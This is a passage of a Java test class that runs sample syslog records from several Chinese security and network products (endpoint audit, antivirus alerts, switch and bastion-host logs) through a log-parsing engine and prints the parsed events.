      data = "<6>{\"version\":\"\\u5929\\u64ce6.3.0.5100\",\"log_name\":\"\\u4f53\\u68c0\\u5206\",\"log_id\":\"70cc8b21d25b04e0f4ca79da9e9c3b7d\",\"create_time\":\"2017-06-08 11:03:12\",\"ip\":\"10.74.121.88\",\"report_ip\":\"18.10.169.10\",\"mac\":\"aae3ccde4830\",\"gid\":1,\"work_ group\":\"workgroup\",\"content\":{\"mid\":\"2b72a771c2639cd78ecdc5571e6f2cd7\",\"gid\":1,\"score\":80,\"event_time\":\"2017-06-08\",\"create_time\":\"2017-06-08\"}}";
      parse(botuEngine, data);
      // 系统修复
      data = "<6>{\"version\":\"\\u5929\\u64ce6.3.0.5100\",\"log_name\":\"\\u7cfb\\u7edf\\u4fee\\u590d\",\"log_id\":\"0 8622e3af63f669a3a07411216476525\",\"create_time\":\"2017-06-08 10:43:00\",\"ip\":\"10.74.121.88\",\"report_ip\":\"18.10.169.10\",\"mac\":\"aae3ccde4830\",\"gid\":1,\"work_ group\":\"workgroup\",\"content\":{\"name\":\"\\u8fdc\\u7a0b\\u684c\\u9762\\u88ab\\u5f00\\u542f\",\"op\": 0,\"desc\":\"\\u5f53\\u524d\\u7535\\u8111\\u5141\\u8bb8\\u5176\\u4ed6\\u7528\\u6237\\u901a\\u8fc7\\u8fdc\\u7a0b\\u684c\\u9762\\u8bbf\\u95ee\\uff0c\\u5982\\u679c\\u4e0d\\u662f\\u60a8\\u81ea\\u5df1 \\u5f00\\u542f\\u7684\\uff0c\\u5efa\\u8bae\\u4fee\\u590d\\uff0c\\u5173\\u95ed\\u8fdc\\u7a0b\\u684c\\u9762\\u3002\",\"company\":\"\\u672a\\u77e5\"}}";
      parse(botuEngine, data);
      // 插件
      data = "<6>{\"version\":\"\\u5929\\u64ce6.3.0.5100\",\"log_name\":\"\\u63d2\\u4ef6\",\"log_id\":\"ce59f63a5eac45700f6b165b9a0fa888\",\"create_time\":\"2017-06-08 10:50:16\",\"ip\":\"10.74.121.88\",\"report_ip\":\"18.10.169.10\",\"mac\":\"aae3ccde4830\",\"gid\":1,\"work_ group\":\"workgroup\",\"content\":{\"name\":\"360\\u9632\\u706b\\u5899\\u529f\\u80fd\\u6a21\\u5757\", \"op\":3,\"desc\":\"360\\u5b89\\u5168\\u536b\\u58eb\\u7684\\u6838\\u5fc3\\u6a21\\u5757\\uff0c\\u5177\\u6709\\u53ef\\u7591\\u6587\\u4ef6\\u5b9e\\u65f6\\u76d1\\u63a7\\u3001\\u53ef\\u7591\\u7f51\\u7ad9\\u9884\\u8b66\\u7b49\\u529f\\u80fd\\uff1b\\u6e05\\u7406\\u540e\\u4f1a\\u5173\\u95ed360\\u5b89\\u5168\\u9632\\u62a4\\u4e2d\\u5fc3\\uff0c\\u7535\\u8111\\u5c06\\u5b58\\u5728\\u5b89\\u5168\\u98ce\\u9669\\u3002\",\"company\":\"360\\u516c\\u53f8\"}}";
      parse(botuEngine, data);
      // Xp盾甲
      data = "<6>{\"version\":\"\\u5929\\u64ce6.3.0.5100\",\"log_name\":\"xp\\u76fe\\u7532\",\"log_id\":\"22632992f3 72c0ef053b9fa12b37843f\",\"create_time\":\"2017-06-08 10:21:23\",\"ip\":\"10.74.121.88\",\"report_ip\":\"18.10.169.10\",\"mac\":\"aae3ccde4830\",\"gid\":1,\"work_ group\":\"workgroup\",\"content\":{\"action\":\"rop\\u653b\\u51fb\",\"detail\":\"\\u8fdb\\u7a0b\\uff1ac:%5c %5cwindows%5c%5cnewcaller.exe \\u653b\\u51fb\\u65b9\\u5f0f\\uff1acaller check\",\"opt\":\"\\u81ea\\u52a8\\u5141\\u8bb8\"}}";
      parse(botuEngine, data);
      // 病毒
      data = "<6>{\"version\":\"\\u5929\\u64ce6.3.0.5100\",\"log_name\":\"\\u75c5\\u6bd2\\u5206\\u6790\",\"log_id\":\" e9e96b496a8d769bb56676e30e69374e\",\"create_time\":\"2017-06-08 09:41:49\",\"ip\":\"10.74.121.88\",\"report_ip\":\"18.10.169.10\",\"mac\":\"aae3ccde4830\",\"gid\":1,\"work_ group\":\"workgroup\",\"content\":{\"name\":\"heur/qvm07.1.2b21.malware.gen\",\"type\":\"\\u672a\\u77e5\\u6216\\u635f\\u574f\\u7684\\u538b\\u7f29\\u5305\",\"virus_path\":\"c:%5c%5c\\u684c\\u9762%5c %5ctwin_52%5c%5cwin95.cih.b_756.exe\",\"op\":\"\\u67e5\\u6740\\u4fee\\u590d\\u5931\\u8d25\",\"task\":\"\\u7528\\u6237\\u67e5\\u6740\"}}";
      parse(botuEngine, data);
      data = "<6>{\"version\":\"\\u5929\\u64ce6.0.0.2500\",\"log_name\":\"\\u8fdb\\u7a0b\\u8fdd\\u89c4\\u8fd0\\u884c\",\"l og_id\":\"0fd042284566ab07bbdcef7f89a48e70\",\"create_time\":\"2017-01-18 15:56:07\",\"ip\":\"172.27.31.39\",\"report_ip\":\"172.27.31.39\",\"mac\":\"6c626db037fb\",\"gid\":1,\"work_group\":\"corp.qihoo.net\",\"content\":{\"path\":\"\",\"name\":\"qq.exe\",\"hash_code\":\"\"}}";
      parse(botuEngine, data);
      // 违规外联
      data = "<6>{\"version\":\"\\u5929\\u64ce6.0.0.2500\",\"log_name\":\"\\u8fdd\\u89c4\\u5916\\u8054\",\"log_id\":\"3ad2f 0749c8a3e6046436c50af0210d1\",\"create_time\":\"2017-01-18 15:55:01\",\"ip\":\"172.27.31.39\",\"report_ip\":\"172.27.31.39\",\"mac\":\"6c626db037fb\",\"gid\":1,\"work_ group\":\"corp.qihoo.net\",\"content\":{\"inoutnet\":1,\"device\":\"wired_card\",\"mode\":\"device\"}}";
      parse(botuEngine, data);
      // 违规运行
      data = "<6>{\"version\":\"\\u5929\\u64ce6.0.0.2500\",\"log_name\":\"\\u8fdb\\u7a0b\\u8fdd\\u89c4\\u8fd0\\u884c\",\"l og_id\":\"0fd042284566ab07bbdcef7f89a48e70\",\"create_time\":\"2017-01-18 15:56:07\",\"ip\":\"172.27.31.39\",\"report_ip\":\"172.27.31.39\",\"mac\":\"6c626db037fb\",\"gid\":1,\"work_ group\":\"corp.qihoo.net\",\"content\":{\"path\":\"\",\"name\":\"qq.exe\",\"hash_code\":\"\"}}";
      parse(botuEngine, data);
      // 互联网出口
      data = "<6>{\"version\":\"\\u5929\\u64ce6.0.0.2500\",\"log_name\":\"\\u4f7f\\u7528\\u8fdd\\u89c4\\u4e92\\u8054\\u7f51\\u51fa\\u53e3\",\"log_id\":\"9f15797a2f13b3c93eefbef732ae885f\",\"create_time\":\"2017-01-18 15:56:57\",\"ip\":\"172.27.31.39\",\"report_ip\":\"172.27.31.39\",\"mac\":\"6c626db037fb\",\"gid\":1,\"work_group\":\"corp.qihoo.net\",\"content\":{\"believe\":0,\"vpn\":0,\"name\":\"DAIRONGQ-E1464A\",\"internet_ip\":\"180.169.82.126\"}}";
      parse(botuEngine, data);
      // 外设使用
      data = "<6>{\"version\":\"\\u5929\\u64ce6.0.0.2500\",\"log_name\":\"\\u5916\\u8bbe\\u4f7f\\u7528\",\"log_id\":\"a253e 041f687b98202e2ff2f4ffdcdd3\",\"create_time\":\"2017-01-18 17:57:17\",\"ip\":\"172.27.31.39\",\"report_ip\":\"172.27.31.39\",\"mac\":\"6c626db037fb\",\"gid\":1,\"work_group\":\"corp.qihoo.net\",\"content\":{\"device_type\":1,\"device_name\":\"SANDISK CRUZER BLADE USB DEVICE\",\"oper_type\":1}}";
      parse(botuEngine, data);
      // 桌面加固
      data = "<6>{\"version\":\"\\u5929\\u64ce6.0.0.2500\",\"log_name\":\"\\u684c\\u9762\\u52a0\\u56fa\",\"log_id\":\"cfbab 99b353f147b52e8fb0670bc7ba4\",\"create_time\":\"2017-01-18 17:58:46\",\"ip\":\"172.27.31.39\",\"report_ip\":\"172.27.31.39\",\"mac\":\"6c626db037fb\",\"gid\":1,\"work_group\":\"corp.qihoo.net\",\"content\":{\"cfg_type\":\"account\",\"operation\":\"passwd_complexy\"}}";
      parse(botuEngine, data);
      // 账户登录登出
      data = "<6>{\"version\":\"\\u5929\\u64ce6.0.0.2500\",\"log_name\":\"\\u8d26\\u53f7\\u767b\\u5f55\\u767b\\u51fa\",\"l og_id\":\"24844ac12006c4a060cfe2ba05651ef0\",\"create_time\":\"2017-01-18 18:00:37\",\"ip\":\"172.27.31.39\",\"report_ip\":\"172.27.31.39\",\"mac\":\"6c626db037fb\",\"gid\":1,\"work_ group\":\"corp.qihoo.net\",\"content\":{\"account_type\":1,\"oper_type\":4,\"account\":\"CORP\\\\zhaoqian g-s\"}}";
      parse(botuEngine, data);
      // 文件审计
      data = "<6>{\"version\":\"\\u5929\\u64ce6.0.0.2500\",\"log_name\":\"\\u6587\\u4ef6\\u5ba1\\u8ba1\",\"log_id\":\"c4cd2 ad71780111045a562843443cf0a\",\"create_time\":\"2017-01-18 18:02:33\",\"ip\":\"172.27.31.39\",\"report_ip\":\"172.27.31.39\",\"mac\":\"6c626db037fb\",\"gid\":1,\"work_ group\":\"corp.qihoo.net\",\"content\":{\"source_device\":4,\"update_file\":\"2016-08-08 14:30:37\",\"access_time\":\"2016-08-08 14:30:37\",\"destination_device\":4,\"md5_file\":\"\",\"destination_file\":\"\\\\\\\\172.27.131.225\\\\ftp\\\\test \\\\sadfsa.txt\",\"source_file\":\"\\\\\\\\172.27.131.225\\\\ftp\\\\test\\\\...................txt\",\"create_file\":\"2016-0 8-08 14:30:37\",\"process_name\":\"E:\\\\Windows\\\\Explorer.exe\",\"oper_type\":4}}";
      parse(botuEngine, data);
      // 打印审计
      data = "<6>{\"version\":\"\\u5929\\u64ce6.0.0.2500\",\"log_name\":\"\\u6253\\u5370\\u5ba1\\u8ba1\",\"log_id\":\"6ec6 51b1db4d40d7b165b535f741518d\",\"create_time\":\"2017-01-18 18:03:24\",\"ip\":\"172.27.31.39\",\"report_ip\":\"172.27.31.39\",\"mac\":\"6c626db037fb\",\"gid\":1,\"work_ group\":\"corp.qihoo.net\",\"content\":{\"print_content\":\"\",\"file_path\":\"\\u5ba1\\u8ba1\\u8f6c\\u8bd1.txt-\\u8bb0\\u4e8b\\u672c\",\"update_file\":\"\",\"access_time\":\"\",\"paper_type\":\"A4\",\"md5_file\":\"\",\"printer_type\":1,\"number_copies\":1,\"number_pages\":4,\"create_file\":\"\",\"printer\":\"SmartPrinter Pro\"}}";
      parse(botuEngine, data);
      // 邮件审计
      data = "<6>{\"version\": \"\\u5929\\u64ce6.0.0.2500\","
          + "\"log_name\": \"\\u90ae\\u4ef6\\u5ba1\\u8ba1\","
          + "\"log_id\": \"81bce 285ed7789f704f2fb55e7199d39\","
          + "\"create_time\": \"2017-01-18 18:05:15\","
          + "\"ip\": \"172.27.31.39\"," + "\"report_ip\": \"172.27.31.39\","
          + "\"mac\": \"6c626db037fb\"," + "\"gid\": 1,"
          + "\"work_ group\": \"corp.qihoo.net\"," + "\"content\": {"
          + "\"content\": \"Date: Mon, 8 Aug 2016 15:18:21 +0800\\r\\nFrom:\\\"zhaoqiang\\\" <zhaoqiang@ipdsms.com>\\r\\nTo: <zhaoqiang.1229@163.com>\\r\\nSubject: <201608081518206055761@ipdsms.com>\\r\\n\",\"sender\":\"\\\"zhaoqiang\\\" <zhaoqiang@ipdsms.com>\",\"recipient\": \"\\\"zhaoqiang.1229\\\" <zhaoqiang.1229@163.com>\","
          + "\"title\": \"test\","
          + "\"content_type\": \"multipart\\/related; boundary=\\\"=====002_Dragon337586738537_=====\\\"; type=\\\"multipart\\/alternative\\\"\","
          + "\"attachments\": null}}";
      parse(botuEngine, data);
      // 进程审计
      data = "<6>{\"version\":\"\\u5929\\u64ce6.0.0.2500\",\"log_name\":\"\\u8fdb\\u7a0b\\u5ba1\\u8ba1\",\"log_id\":\"505e 300d7e4908e874a2137202fe4617\",\"create_time\":\"2017-01-18 18:08:05\",\"ip\":\"172.27.31.39\",\"report_ip\":\"172.27.31.39\",\"mac\":\"6c626db037fb\",\"gid\":1,\"work_ group\":\"corp.qihoo.net\",\"content\":{\"starttime\":\"2016-08-08 14:17:44\",\"process_id\":7336,\"hash_code\":\"42ec9065d9bf266ade924b066c783a56\",\"status\":2,\"p rocess_name\":\"SEARCHPROTOCOLHOST.EXE\",\"endtime\":\"2016-08-08 14:22:13\",\"file_path\":\"E:\\\\WINDOWS\\\\SYSNATIVE\\\\SEARCHPROTOCOLHOST.EXE\"}}";
      parse(botuEngine, data);
      // U盘审计
      data = "<6>{\"version\":\"\\u5929\\u64ce6.0.0.2500\",\"log_name\":\"\\u5b89\\u5168U\\u76d8\\u5ba1\\u8ba1\",\"log_id\":\"8fa40015397b2d34d254de7954061be8\",\"create_time\":\"2017-01-18 18:09:42\",\"ip\":\"172.27.31.39\",\"report_ip\":\"172.27.31.39\",\"mac\":\"6c626db037fb\",\"gid\":1,\"work_group\":\"corp.qihoo.net\",\"content\":{\"source_device\":1,\"udisk_account\":\"test\",\"source_file\":\"E:\\\\Users\\\\zhaoqiang-s\\\\Desktop\\\\204\\\\policy_ctrl_white.sql\",\"destination_device\":2,\"oper_type\":2 ,\"client_id\":1,\"udisk_id\":\"C3DE804100004040AA16\",\"destination_file\":\"\\u5b89\\u5168U\\u76d8:\\\\204\\\\policy_ctrl_white.sql\",\"computer_name\":\"ZHAOQIANG-D1\",\"usb_number\":null,\"usb_name\":null}}";
      parse(botuEngine, data);
      // 开关机审计
      data = "<6>{\"version\":\"\\u5929\\u64ce6.0.0.2500\",\"log_name\":\"\\u5f00\\u5173\\u673a\\u5ba1\\u8ba1\",\"log_id\" :\"8055a376f91d58e718370a00b48dc023\",\"create_time\":\"2017-01-18 18:10:33\",\"ip\":\"172.27.31.39\",\"report_ip\":\"172.27.31.39\",\"mac\":\"6c626db037fb\",\"gid\":1,\"work_group\":\"corp.qihoo.net\",\"content\":{\"oper_type\":2}}";
      parse(botuEngine, data);
      // 网络访问审计
      data = "<6>{\"version\":\"\\u5929\\u64ce6.0.0.2500\",\"log_name\":\"\\u7f51\\u7edc\\u8bbf\\u95ee\\u5ba1\\u8ba1\",\"log_id\":\"76909ebdcd337fd49e02bfd79c9a1401\",\"create_time\":\"2017-01-18 18:11:27\",\"ip\":\"172.27.31.39\",\"report_ip\":\"172.27.31.39\",\"mac\":\"6c626db037fb\",\"gid\":1,\"work_group\":\"corp.qihoo.net\",\"content\":{\"process_md5\":\"B37FE8752232060D8283A0174E32FA4D\",\"process_path\":\"E:\\\\Users\\\\zhaoqiang-s\\\\AppData\\\\Roaming\\\\360se6\\\\Application\\\\360se.exe\", \"url\":\"dd.browser.360.cn\\/static\\/a\\/388.6667.gif?14706372763795445875339\",\"process_cmdline\":\"\\\"E:\\\\Users\\\\zhaoqiang-s\\\\AppData\\\\Roaming\\\\360se6\\\\Application\\\\360se.exe\\\" \",\"process_name\":\"360se.exe\",\"destination_ip\":\"106.39.219.26\"}}";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  // 奇安信EPS
  public void testEpsQianxin() {
    String parserFile = "./resources/parsers/eps_qianxin_skylar[6s]_warn.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      // 病毒
      String data = "<6>{\"version\":\"\\u5929\\u64ce6.6.0.4000\",\"log_name\":\"\\u75c5\\u6bd2\\u5206\\u6790\",\"log_id\":\"7a33b6abe8e752d1a1716fea76da59b2\",\"create_time\":\"2019-11-06 14:58:17\",\"ip\":\"192.168.0.211\",\"report_ip\":\"192.168.0.211\",\"mac\":\"94c691583e3a\",\"gid\":1,\"work_group\":\"\",\"content\":{\"name\":\"Risk.Blacklist.AccessDeined\",\"type\":\"\\u6728\\u9a6c\",\"virus_path\":\"C:\\\\Users\\\\Administrator\\\\Desktop\\\\\\u75c5\\u6bd2\\u6837\\u672c\\\\\\u5206\\u6790\\u62a5\\u544a.zip=>\\u5206\\u6790\\u62a5\\u544a\\\\\\u75c5\\u6bd2\\u6837\\u672c\",\"op\":\"\\u672a\\u5904\\u7406\",\"task\":\"\\u7528\\u6237\\u67e5\\u6740\",\"login_user\":\"Administrator\",\"client_name\":\"THTF-PC\"}}";
      parse(botuEngine, data);
      // 进程
      data = "<6>2019-10-23T10:47:50+08:00 WIN-9LK33364IP6 skylar_log[33740]: {\"log_name\":\"logcenter:skylar-client_process_running\",\"create_time\":\"2019-10-23 10:47:50\",\"ip\":\"192.168.0.210\",\"report_ip\":\"192.168.0.210\",\"mac\":\"94c691586fa6\",\"gid\":\"1\",\"content\":{\"cmdline\":\"/??/C:/Windows/Sysnative/conhost.exe \\\"1695405018-3698715-1486375948400536693230671744-18745854181237369874-1100526991\",\"gid\":1,\"group_name\":\"默认分组\",\"mid\":\"e15d9a0a01324cafad310e56406850f7\",\"operate\":\"stop\",\"pid\":6024,\"process_company\":\"Microsoft Corporation\",\"process_copyright\":\"© Microsoft Corporation. All rights reserved.\",\"process_description\":\"Console Window Host\",\"process_file_version\":\"6.1.7601.23677 (win7sp1_ldr.170209-0600)\",\"process_guid\":\"347CBBF7F8950CDA50B9163FA3B65F7C\",\"process_integrity\":3,\"process_internal_name\":\"ConHost\",\"process_md5\":\"ce476f23405aadc46039ac13127df473\",\"process_name\":\"conhost.exe\",\"process_original_name\":\"CONHOST.EXE\",\"process_parent_guid\":\"77180C75EC5DDF081852FDA20D74DADF\",\"process_parent_md5\":\"\",\"process_parent_path\":\"\",\"process_parent_pid\":648,\"process_path\":\"c:/windows/sysnative/conhost.exe\",\"process_product_name\":\"Microsoft® Windows® Operating System\",\"process_product_version\":\"6.1.7601.23677\",\"process_signature\":\"Microsoft Windows\",\"process_user\":\"\",\"serial_num\":\"5e3dbf41-c660-401d-895e-2d75460599b6\",\"sip\":\"192.168.0.210\",\"starttime\":\"2019-10-23 10:37:57\",\"terminal\":\"THTF-PC\",\"time_event\":\"2019-10-23 10:37:57\"}}";
      parse(botuEngine, data);
      // 文件
      data = "<6>2019-10-23T10:58:52+08:00 WIN-9LK33364IP6 skylar_log[33740]: {\"log_name\":\"logcenter:skylar-client_file_operations\",\"create_time\":\"2019-10-23 10:58:52\",\"ip\":\"192.168.0.210\",\"report_ip\":\"192.168.0.210\",\"mac\":\"94c691586fa6\",\"gid\":\"1\",\"content\":{\"cmdline\":\"\\\"D:/软件/FeiQ.exe\\\" \",\"file_md5\":\"\",\"file_oldpath\":\"\",\"file_path\":\"c:/users/administrator/desktop/7z1805-x64.exe\",\"mid\":\"e15d9a0a01324cafad310e56406850f7\",\"operate\":\"create\",\"pid\":1208,\"process_guid\":\"791B3E747A6D941E0235A5DDBBAA4C4D\",\"process_md5\":\"2debabb8971d8819f71129e7b8490732\",\"process_name\":\"feiq.exe\",\"process_path\":\"d:/软件/feiq.exe\",\"process_user\":\"Administrator\",\"serial_num\":\"5e3dbf41-c660-401d-895e-2d75460599b6\",\"sip\":\"192.168.0.210\",\"time_event\":\"2019-10-23 10:48:55\"}}";
      parse(botuEngine, data);
      // 注册表
      data = "<6>2019-10-23T10:59:21+08:00 WIN-9LK33364IP6 skylar_log[33740]: {\"ip\":\"192.168.0.210\",\"report_ip\":\"192.168.0.210\",\"mac\":\"94c691586fa6\",\"gid\":\"1\",\"log_name\":\"logcenter:skylar-client_registry_changes\",\"create_time\":\"2019-10-23 10:59:21\",\"content\":{\"cmdline\":\"\\\"C:/Users/Administrator/Desktop/7z1805-x64.exe\\\" \",\"mid\":\"e15d9a0a01324cafad310e56406850f7\",\"operate\":\"addkey\",\"pid\":5820,\"process_guid\":\"320C606C0EF863876EBCC5EE21636170\",\"process_md5\":\"1deefe6649699946590856e901bbe5ff\",\"process_name\":\"7z1805-x64.exe\",\"process_path\":\"c:/users/administrator/desktop/7z1805-x64.exe\",\"process_user\":\"Administrator\",\"reg_key\":\"HKEY_LOCAL_MACHINE/SOFTWARE/Classes/Directory/shellex/DragDropHandlers/7-Zip\",\"reg_oldkey\":\"\",\"reg_oldvalue\":\"\",\"reg_value\":\"\",\"reg_valuename\":\"\",\"reg_valuetype\":\"\",\"serial_num\":\"5e3dbf41-c660-401d-895e-2d75460599b6\",\"sip\":\"192.168.0.210\",\"time_event\":\"2019-10-23 10:49:40\"}}";
      parse(botuEngine, data);
      // IP访问
      data = "<6>2019-10-23T10:47:19+08:00 WIN-9LK33364IP6 skylar_log[33740]: {\"gid\":\"1\",\"log_name\":\"logcenter:skylar-client_processsocket\",\"create_time\":\"2019-10-23 10:47:19\",\"ip\":\"192.168.0.210\",\"report_ip\":\"192.168.0.210\",\"mac\":\"94c691586fa6\",\"content\":{\"addr_type\":\"IPV6\",\"cmdline\":\"\\\"C:/Program Files/JetBrains/IntelliJ IDEA 2018.3.3/jre64/bin/java.exe\\\" -Djava.awt.headless=true -Didea.version==2018.3.3 -Xmx768m -Didea.maven.embedder.version=3.0.3 -Dfile.encoding=GBK -classpath \\\"C:/Program Files/JetBrains/IntelliJ IDEA 2018.3.3/lib/resources_en.jar;C:/Program Files/JetBrains/IntelliJ IDEA 2018.3.3/lib/log4j.jar;C:/Program Files/JetBrains/IntelliJ IDEA 2018.3.3/lib/slf4j-api-1.7.25.jar;C:/Program Files/JetBrains/IntelliJ IDEA 2018.3.3/lib/slf4j-log4j12-1.7.25.jar;C:/Program Files/JetBrains/IntelliJ IDEA 2018.3.3/lib/util.jar;C:/Program Files/JetBrains/IntelliJ IDEA 2018.3.3/lib/annotations.jar;C:/Program Files/JetBrains/IntelliJ IDEA 2018.3.3/lib/jdom.jar;C:/Program Files/JetBrains/IntelliJ IDEA 2018.3.3/lib/trove4j.jar;C:/Program Files/JetBrains/IntelliJ IDEA 2018.3.3/plugins/maven/lib/lucene-core-2.4.1.jar;C:/Program Files/JetBrains/IntelliJ IDEA 2018.3.3/plugins/maven/lib/maven-server-api.jar;C:/Program Files/JetBrains/IntelliJ IDEA 2018.3.3/plugins/maven/lib/maven3-server-common.jar;C:/P\",\"dipv6\":\"[::ffff:127.0.0.1]\",\"dport\":59845,\"group_name\":\"默认分组\",\"mid\":\"e15d9a0a01324cafad310e56406850f7\",\"pid\":2164,\"process_guid\":\"2891F435C5E536EEBBD0F218F6B3B7D8\",\"process_md5\":\"8e9d192ddb27b8281935baaa21469070\",\"process_name\":\"java.exe\",\"process_path\":\"c:/program files/jetbrains/intellij idea 2018.3.3/jre64/bin/java.exe\",\"process_user\":\"Administrator\",\"proto\":\"TCP\",\"serial_num\":\"5e3dbf41-c660-401d-895e-2d75460599b6\",\"sipv6\":\"::\",\"sport\":0,\"sreportip\":\"192.168.0.210\",\"time_event\":\"2019-10-23 10:42:48\"}}";
      parse(botuEngine, data);
      // U盘
      data = "<6>2019-10-23T19:26:03+08:00 WIN-9LK33364IP6 skylar_log[33740]: {\"create_time\":\"2019-10-23 19:26:03\",\"ip\":\"192.168.0.210\",\"report_ip\":\"192.168.0.210\",\"mac\":\"94c691586fa6\",\"gid\":\"1\",\"log_name\":\"logcenter:skylar-client_udisk\",\"content\":{\"cmdline\":\"C:/Windows/System32/svchost.exe -k LocalSystemNetworkRestricted\",\"file_md5\":\"\",\"file_path\":\"g:/readyboost.sfcache\",\"mid\":\"e15d9a0a01324cafad310e56406850f7\",\"operate\":\"open\",\"pid\":636,\"process_guid\":\"0A63C544ADFCD02B6B9F9D861BA18F91\",\"process_md5\":\"2f50120369617267f94c0a139542eb7c\",\"process_name\":\"svchost.exe\",\"process_path\":\"c:/windows/system32/svchost.exe\",\"process_user\":\"SYSTEM\",\"serial_num\":\"5e3dbf41-c660-401d-895e-2d75460599b6\",\"sip\":\"192.168.0.210\",\"time_event\":\"2019-10-23 19:15:59\",\"usb_sn\":\"27TEALKN\"}}";
      parse(botuEngine, data);
      data = "<6>2019-10-23T10:47:50+08:00 WIN-9LK33364IP6 skylar_log[33740]: {\"log_name\":\"logcenter:skylar-client_process_running\",\"create_time\":\"2019-10-23 10:47:50\",\"ip\":\"192.168.0.210\",\"report_ip\":\"192.168.0.210\",\"mac\":\"94c691586fa6\",\"gid\":\"1\",\"content\":{\"cmdline\":\"/??/C:/Windows/Sysnative/conhost.exe \\\"1695405018-3698715-1486375948400536693230671744-18745854181237369874-1100526991\",\"gid\":1,\"group_name\":\"默认分组\",\"mid\":\"e15d9a0a01324cafad310e56406850f7\",\"operate\":\"stop\",\"pid\":6024,\"process_company\":\"Microsoft Corporation\",\"process_copyright\":\"© Microsoft Corporation. All rights reserved.\",\"process_description\":\"Console Window Host\",\"process_file_version\":\"6.1.7601.23677 (win7sp1_ldr.170209-0600)\",\"process_guid\":\"347CBBF7F8950CDA50B9163FA3B65F7C\",\"process_integrity\":3,\"process_internal_name\":\"ConHost\",\"process_md5\":\"ce476f23405aadc46039ac13127df473\",\"process_name\":\"conhost.exe\",\"process_original_name\":\"CONHOST.EXE\",\"process_parent_guid\":\"77180C75EC5DDF081852FDA20D74DADF\",\"process_parent_md5\":\"\",\"process_parent_path\":\"\",\"process_parent_pid\":648,\"process_path\":\"c:/windows/sysnative/conhost.exe\",\"process_product_name\":\"Microsoft® Windows® Operating System\",\"process_product_version\":\"6.1.7601.23677\",\"process_signature\":\"Microsoft Windows\",\"process_user\":\"\",\"serial_num\":\"5e3dbf41-c660-401d-895e-2d75460599b6\",\"sip\":\"192.168.0.210\",\"starttime\":\"2019-10-23 10:37:57\",\"terminal\":\"THTF-PC\",\"time_event\":\"2019-10-23 10:37:57\"}}";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  // 华为交换机
  public void testHuaweiSwitch() {
    String parserFile = "./resources/parsers/switch_huawei_switch_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "Aug 6 2011 20:34:46 HUAWEI %% 01 HWCM/5/EXIT(I)[1]: exit from configure mode";
      parse(botuEngine, data);
      data = "Jan 8 2013 3:58:15+07:00 HUAWEI %% 01 HWCM/5/EXIT(I)[1]: exit from configure mode";
      parse(botuEngine, data);
      data = "<188>Jun 13 2021 02:14:17 hexin %%01INFO/4/SUPPRESS_LOG(l)[224]:Last message repeated 2 times.(InfoID=1077493787, ModuleName=SHELL, InfoAlias=LOGINFAILED)";
      parse(botuEngine, data);
      data = "<188>Sep 27 2022 03:11:07 Server-SW %%01SHELL/4/LOGINFAILED(s)[19501]:Failed to login. (Ip=192.168.101.6, UserName=**, Times=1, AccessType=TELNET, VpnName=)";
      parse(botuEngine, data);
    } catch (Exception e) {
      e.printStackTrace();
    }
  }

  //建恒信安3.0.6.sec
  public void testJhsecSecSyslog() {
    String parserFile = "./resources/parsers/bastion_jhsec_jh-oam[3.0.6.sec]_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "log_type=1 username=admin userid=admin timestamp=1638781386083 remoteIP=172.16.0.100 op=Login module=Authentication result=1 uin= instanceid=";
      parse(botuEngine, data);
      data = "log_type=8 username=admin userid=admin timestamp=1638777025501 remoteIP=172.16.0.100 op=2 module=38 result=1 actionId=00-f3c8a24f-8185-41fc-84e6-50e428df89af uin= instanceid=";
      parse(botuEngine, data);
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  //天融信主机监控审计
  public void testTopsecTopdesk() {
    String parserFile = "./resources/parsers/eps_topsec_topdesk[3.1.0.154]_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<140>1 2021-03-12T16:24:32Z topdesk eventinfo - - - id=\"151337\" agentid=\"14DEB7-BBDE-1ED3-AB83-9BA52F2D3B37AD\" logtype=\"PORT_WL\" logtime=\"2021-03-13 08:00:00.142\" action=\"监听\" object_class=\"白名单端口\" object_name=\"631\" objectinfo=\"\" reason=\"端口允许监听\" loglevel=\"2\" handle=\"允许\" result=\"成功\" subject=\"<用户帐号>topsec</用户帐号><计算机名称>topsec-PC</计算机名称><进程名>cupsd</进程名><进程ID>98461</进程ID>\" subject_name=\"topsec-PC\" subject_class=\"计算机\" trigger_type=\"策略\" trigger_name=\"端口监听监控\" trigger_text=\"7312757\" event_from=\"tdasvc.portlisten\" event_id=\"\" agentip=\"172.19.4.127\" ipcode=\"-1408039809\" agentmac=\"00:0C:29:FD:6A:59\" depart=\"/topsec/\" username=\"\" agentversion=\"_3.0-0.0.1140.201231.uos20_amd64\" cid=\"端口白名单报警.计算机.监听.白名单端口.允许.成功\" is_send=\"0\" clog=\"0\" ishandle=\"\" sourceserverip=\"172.19.12.58\"";
      parse(botuEngine, data);
